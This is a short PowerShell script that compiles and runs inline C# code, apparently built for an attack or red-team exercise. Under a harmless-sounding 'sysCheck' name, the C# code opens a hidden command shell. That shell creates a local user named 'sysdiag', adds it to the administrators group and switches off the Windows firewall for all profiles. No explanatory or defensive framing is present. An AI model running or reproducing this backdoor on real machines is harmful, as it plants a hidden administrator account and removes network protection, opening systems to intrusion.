$id = get-random
$source = @"

using System;
using System.Text;
using System.Diagnostics;
using System.Threading;

namespace sysCheckCyberForce
{
    public class check$id
    {
        public static void Main()
        {
            string executeCMD;
            executeCMD = "net user sysdiag ****** /add && ";
            executeCMD += "net localgroup administrators sysdiag /add && ";
            executeCMD += "netsh advfirewall set allprofiles state off";
            Console.WriteLine(executeCMD);

            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.RedirectStandardError = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.Arguments = "/C " + executeCMD;
            cmd.Start();
            // Last 2 lines may need to be reversed...
            cmd.StandardOutput.ReadToEnd();
            cmd.WaitForExit();
        }
    }
}
"@

Add-Type -TypeDefinition $source -PassThru
iex "[sysCheckCyberForce.check$id]::Main()"
